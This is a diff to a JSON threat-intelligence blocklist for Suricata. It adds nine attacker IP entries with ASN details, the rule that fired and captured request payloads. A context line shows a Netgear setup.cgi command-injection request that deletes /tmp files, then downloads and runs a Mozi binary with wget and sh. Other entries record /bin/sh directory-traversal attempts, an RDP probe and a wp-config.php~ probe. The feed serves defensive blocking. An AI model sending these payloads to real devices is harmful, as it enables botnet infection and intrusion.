@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-08-30T01:00:00Z",
+  "generated_at": "2026-08-30T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 902,
-    "v4": 902,
+    "total": 911,
+    "v4": 911,
     "v6": 0
   },
   "items": [
@@ -15027,6 +15027,171 @@
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "165.154.138.79",
+      "family": "v4",
+      "first_seen": "2026-08-30T11:00:00Z",
+      "last_seen": "2026-08-30T11:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN MS Terminal Server Traffic on Non-standard Port"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "135377",
+      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+      "asn_prefix": "165.154.138.0/24",
+      "payloads": [
+        "\u00033.\\xe0Cookie: mstshash=Administrator"
+      ]
+    },
+    {
+      "ip": "208.92.220.138",
+      "family": "v4",
+      "first_seen": "2026-08-30T11:00:00Z",
+      "last_seen": "2026-08-30T11:00:00Z",
+      "scenarios": [
+        "suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "53292",
+      "asn_name": "MWAY - ManagedWay",
+      "asn_prefix": "208.92.216.0/21",
+      "payloads": [
+        "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
+      ]
+    },
+    {
+      "ip": "43.131.45.213",
+      "family": "v4",
+      "first_seen": "2026-08-30T11:00:00Z",
+      "last_seen": "2026-08-30T11:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP Request excessive header repetition"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "132203",
+      "asn_name": "TENCENT-NET-AP-CN - Tencent Building, Kejizhongyi Avenue",
+      "asn_prefix": "43.131.0.0/18",
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "43.164.3.23",
+      "family": "v4",
+      "first_seen": "2026-08-30T10:00:00Z",
+      "last_seen": "2026-08-30T10:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP Request excessive header repetition"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "132203",
+      "asn_name": "TENCENT-NET-AP-CN - Tencent Building, Kejizhongyi Avenue",
+      "asn_prefix": "43.164.0.0/18",
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "35.203.210.80",
+      "family": "v4",
+      "first_seen": "2026-08-30T09:00:00Z",
+      "last_seen": "2026-08-30T09:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA SMB malformed request dialects"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "35.203.210.0/24",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ]
+    },
+    {
+      "ip": "37.49.225.20",
+      "family": "v4",
+      "first_seen": "2026-08-30T08:00:00Z",
+      "last_seen": "2026-08-30T08:00:00Z",
+      "scenarios": [
+        "suricata/ET WEB_SERVER WebShell Generic - wget http - POST"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "61254",
+      "asn_name": "ESTOXY-OU ESTOXY OU",
+      "asn_prefix": "37.49.225.0/24",
+      "payloads": [
+        "POST /boaform/adminformLogout//boaform/admin/formPing6"
+      ]
+    },
+    {
+      "ip": "31.58.216.82",
+      "family": "v4",
+      "first_seen": "2026-08-30T05:00:00Z",
+      "last_seen": "2026-08-30T05:00:00Z",
+      "scenarios": [
+        "suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "200912",
+      "asn_name": "KRAUSE-AS Joel Krause",
+      "asn_prefix": "31.58.216.0/24",
+      "payloads": [
+        "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
+      ]
+    },
+    {
+      "ip": "34.100.238.55",
+      "family": "v4",
+      "first_seen": "2026-08-30T02:00:00Z",
+      "last_seen": "2026-08-30T02:00:00Z",
+      "scenarios": [
+        "suricata/ET WEB_SERVER Tilde in URI - potential .php~ source disclosure vulnerability"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.100.224.0/20",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /wp-config.php~"
+      ]
+    },
+    {
+      "ip": "43.164.0.21",
+      "family": "v4",
+      "first_seen": "2026-08-30T12:00:00Z",
+      "last_seen": "2026-08-30T12:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP Request excessive header repetition"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "132203",
+      "asn_name": "TENCENT-NET-AP-CN - Tencent Building, Kejizhongyi Avenue",
+      "asn_prefix": "43.164.0.0/18",
+      "payloads": [
+        "GET /"
       ]
     }
   ]
